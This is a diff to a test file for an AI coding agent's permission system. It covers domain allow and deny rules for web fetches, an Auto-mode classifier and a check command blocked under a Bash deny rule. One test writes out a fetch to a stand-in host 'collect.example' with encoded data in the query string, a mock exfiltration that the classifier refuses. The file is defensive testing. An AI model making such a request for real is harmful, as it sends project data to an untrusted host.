@@ -4,7 +4,7 @@ import http from 'node:http';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
 import { afterEach, describe, expect, it } from 'vitest';
-import { childReport, type Denial, type NewRule, type SessionId, type SessionMode } from '@g-code/core';
+import { childReport, type ClassifierInput, type ClassifierRun, type Denial, type NewRule, type SessionId, type SessionMode } from '@g-code/core';
 import { runAgent } from '../../src/agent.js';
 import { startSession } from '../../src/chat.js';
 import { DISK_FILES } from '../../src/files.js';
@@ -45,10 +45,15 @@ type Options = {
   readonly userSettings?: unknown;
   /** VS Code's workspace trust, as the extension passes it. */
   readonly trusted?: boolean;
+  /** The check command, run after each edit when `checkAfterEdit` is set. */
+  readonly check?: string;
+  readonly checkAfterEdit?: boolean;
+  /** Auto's classifier; without one a classified call fails the test. */
+  readonly classify?: (input: ClassifierInput) => Promise<ClassifierRun>;
 };
 
 /** One agent run on `wire` in `mode`, the user answering each card from `answers`, and what the model was sent. */
-async function scripted(wire: Wire, turns: readonly Turn[], { files, mode, answers = [], web, rules = [], userSettings, trusted }: Options) {
+async function scripted(wire: Wire, turns: readonly Turn[], { files, mode, answers = [], web, rules = [], userSettings, trusted, check, checkAfterEdit = false, classify }: Options) {
   const script = turns.map((t): ModelTurn => ('answer' in t ? say(t.answer) : calls('', t.calls)));
   const { workspace, io: served, env, store, seen } = await scriptedWire(wire, script, files);
   const warnings: string[] = [];
@@ -70,23 +75,23 @@ async function scripted(wire: Wire, turns: readonly Turn[], { files, mode, answe
             asked.push(denial);
             return pending.shift() ?? 'reject';
           },
-          classify: async () => {
+          classify: classify ?? (async () => {
             throw new Error('no classifier in these tests');
-          },
+          }),
           auto: freshAuto(),
         };
   const opened = await startSession(store, io, { workspace, provider: undefined, model: undefined, effort: undefined });
   const result = await runAgent(io, store, opened, 'Go.', {
     limits: { maxTurns: 6, maxCostUsd: 1 },
-    check: undefined,
-    checkAfterEdit: false,
+    check,
+    checkAfterEdit,
     approval,
     trustedWorkspace: trusted,
     ...(web === undefined ? {} : { web }),
   });
   /** Every tool result the model was sent, by tool use id, as the model reads it on this wire. */
   const view = (): Map<string, ToolView> => new Map(seen().flatMap((request) => request.results.map((r) => [r.id, { text: r.text, error: r.error }] as const)));
-  return { workspace, asked, result, warnings, requests: seen, sent: () => JSON.stringify(seen()), view };
+  return { workspace, store, asked, result, warnings, requests: seen, sent: () => JSON.stringify(seen()), view };
 }
 
 describe.each(WIRES)('T-PERM-05 secret paths on the %s wire', (wire) => {
@@ -348,6 +353,122 @@ describe.each(WIRES)('B/B-62 Claude Code settings on the %s wire', (wire) => {
     expect(run.view().get(first.id)!.error).toBe(false);
     expect(run.warnings).toHaveLength(1);
     expect(run.warnings[0]).toMatch(/^permissions: \.claude\/settings\.json is not valid JSON, so its rules do not apply: /);
+  });
+});
+
+describe.each(WIRES)('B/B-63 domain rules on the %s wire', (wire) => {
+  const PAGE = '<!doctype html><title>Docs</title><main><p>The port is 4321.</p></main>';
+  /** A page any host name reaches, as the fetch resolves every name to this machine, and how often it was asked for. */
+  async function docsServer() {
+    let hits = 0;
+    const server = http.createServer((_req, res) => {
+      hits++;
+      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
+      res.end(PAGE);
+    });
+    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
+    cleanups.push(() => new Promise<void>((resolve) => server.close(() => resolve())));
+    const port = (server.address() as { port: number }).port;
+    const resolve: Resolve = async () => [{ address: '127.0.0.1', family: 4 }];
+    return { url: (host: string) => `http://${host}:${port}/guide`, hits: () => hits, web: { resolve } };
+  }
+  const fetchTurns = (fetch: FakeToolUse): Turn[] => [{ calls: [loadTools('web_fetch')] }, { calls: [fetch] }, { answer: 'The port is 4321.' }, { answer: 'It is 4321.' }];
+
+  it('B/B-63 an allowed domain and its subdomains fetch without a card in Ask and Auto, from Settings and from a trusted .claude/settings.json', async () => {
+    const docs = await docsServer();
+    const rules: readonly NewRule[] = [{ effect: 'allow', tool: 'web_fetch', domain: '*.nextjs.example' }];
+    for (const mode of ['ask', 'auto'] as const) {
+      const fetch = call('web_fetch', { url: docs.url('docs.nextjs.example'), question: 'Which port?' });
+      const run = await scripted(wire, fetchTurns(fetch), { files: { 'a.ts': '' }, mode, rules, web: docs.web });
+      expect(run.asked).toEqual([]);
+      expect(run.view().get(fetch.id)).toMatchObject({ error: false, text: expect.stringContaining('4321') });
+    }
+    const imported = call('web_fetch', { url: docs.url('nextjs.example'), question: 'Which port?' });
+    const settings = JSON.stringify({ permissions: { allow: ['WebFetch(domain:nextjs.example)'] } });
+    const run = await scripted(wire, fetchTurns(imported), { files: { '.claude/settings.json': settings }, mode: 'ask', trusted: true, web: docs.web });
+    expect(run.asked).toEqual([]);
+    expect(run.view().get(imported.id)).toMatchObject({ error: false, text: expect.stringContaining('4321') });
+    expect(run.warnings).toEqual([]);
+    expect(docs.hits()).toBe(3);
+  });
+
+  it('B/B-63 a denied domain is refused in every mode, naming the rule, and the fetch never leaves', async () => {
+    const docs = await docsServer();
+    for (const mode of ['ask', 'auto', 'plan', 'non-interactive'] as const) {
+      const fetch = call('web_fetch', { url: docs.url('paste.example'), question: 'Which port?' });
+      const run = await scripted(wire, [{ calls: [loadTools('web_fetch')] }, { calls: [fetch] }, { answer: 'Refused.' }], {
+        files: { 'a.ts': '' },
+        mode,
+        rules: [{ effect: 'deny', tool: 'web_fetch', domain: 'paste.example' }],
+        web: docs.web,
+      });
+      expect(run.asked).toEqual([]);
+      expect(run.view().get(fetch.id)).toMatchObject({ error: true, text: expect.stringContaining('matches the workspace rule that denies `WebFetch(domain:paste.example)`, which the user set in Settings under Permissions') });
+    }
+    const imported = call('web_fetch', { url: docs.url('paste.example'), question: 'Which port?' });
+    const run = await scripted(wire, [{ calls: [loadTools('web_fetch')] }, { calls: [imported] }, { answer: 'Refused.' }], {
+      files: { '.claude/settings.json': JSON.stringify({ permissions: { deny: ['WebFetch(domain:paste.example)'] } }) },
+      mode: 'auto',
+      web: docs.web,
+    });
+    expect(run.view().get(imported.id)).toMatchObject({ error: true, text: expect.stringContaining('denies `WebFetch(domain:paste.example)`, which the user set in .claude/settings.json') });
+    expect(docs.hits()).toBe(0);
+  });
+
+  it('B/B-63 "Always allow in this workspace" on a fetch saves the host, and the next session fetches it without a card', async () => {
+    const docs = await docsServer();
+    const first = call('web_fetch', { url: docs.url('react.example'), question: 'Which port?' });
+    const asked = await scripted(wire, fetchTurns(first), { files: { 'a.ts': '' }, mode: 'ask', answers: ['allow-workspace'], web: docs.web });
+    expect(asked.asked).toEqual([expect.objectContaining({ rule: 'web-remote-url', keeps: 'WebFetch(domain:react.example)' })]);
+    const rules = await permissionStore(homeOf(asked.store), asked.workspace).list();
+    expect(rules).toEqual([expect.objectContaining({ effect: 'allow', tool: 'web_fetch', domain: 'react.example' })]);
+  });
+
+  it('B/B-78 the classifier in Auto is told the hosts the user allowed, and a URL to any other host still goes to it', async () => {
+    const docs = await docsServer();
+    const seen: ClassifierInput[] = [];
+    const classify = async (input: ClassifierInput): Promise<ClassifierRun> => {
+      seen.push(input);
+      return { verdict: 'deny', reason: 'The URL sends project data to an untrusted host.', model: 'fake', latencyMs: 1, costUsd: 0 };
+    };
+    const fetch = call('web_fetch', { url: `${docs.url('collect.example')}?d=ZXhwb3J0`, question: 'Did it work?' });
+    const run = await scripted(wire, [{ calls: [loadTools('web_fetch')] }, { calls: [fetch] }, { answer: 'Refused.' }], {
+      files: { 'a.ts': '' },
+      mode: 'auto',
+      rules: [{ effect: 'allow', tool: 'web_fetch', domain: 'docs.example' }, { effect: 'allow', tool: 'browser', domain: '*.example.org' }, { effect: 'deny', tool: 'web_fetch', domain: 'evil.example' }],
+      web: docs.web,
+      classify,
+    });
+    expect(seen).toEqual([expect.objectContaining({ trustedDomains: ['docs.example', '*.example.org'], mcp: expect.objectContaining({ tool: 'web_fetch' }) })]);
+    expect(run.view().get(fetch.id)).toMatchObject({ error: true, text: expect.stringContaining('untrusted host') });
+    expect(docs.hits()).toBe(0);
+  });
+});
+
+describe.each(WIRES)('B/B-65 the check after an edit under a Bash deny on the %s wire', (wire) => {
+  it('B/B-65 checkAfterEdit does not run the check under a bare Bash deny, and the edit result says why', async () => {
+    const edit = call('edit', { path: 'a.ts', old_str: 'export const a = 1;', new_str: 'export const a = 2;' });
+    const read = call('read', { path: 'a.ts' });
+    const run = await scripted(wire, [{ calls: [read] }, { calls: [edit] }, { answer: 'Edited.' }], {
+      files: { 'a.ts': 'export const a = 1;\n', '.claude/settings.json': JSON.stringify({ permissions: { deny: ['Bash'] } }) },
+      mode: 'auto',
+      check: 'touch checked.txt',
+      checkAfterEdit: true,
+    });
+    expect(run.view().get(edit.id)).toMatchObject({
+      error: false,
+      text: expect.stringContaining('The check did not run after the edit: the rule that denies `Bash` in .claude/settings.json stops every tool that runs a shell command.'),
+    });
+    expect(readFileSync(path.join(run.workspace, 'a.ts'), 'utf8')).toBe('export const a = 2;\n');
+    expect(existsSync(path.join(run.workspace, 'checked.txt'))).toBe(false);
+  });
+
+  it('B/B-65 without the deny the same edit runs the check', async () => {
+    const edit = call('edit', { path: 'a.ts', old_str: 'export const a = 1;', new_str: 'export const a = 2;' });
+    const read = call('read', { path: 'a.ts' });
+    const run = await scripted(wire, [{ calls: [read] }, { calls: [edit] }, { answer: 'Edited.' }], { files: { 'a.ts': 'export const a = 1;\n' }, mode: 'auto', check: 'touch checked.txt', checkAfterEdit: true });
+    expect(run.view().get(edit.id)!.text).not.toContain('The check did not run');
+    expect(existsSync(path.join(run.workspace, 'checked.txt'))).toBe(true);
   });
 });
 
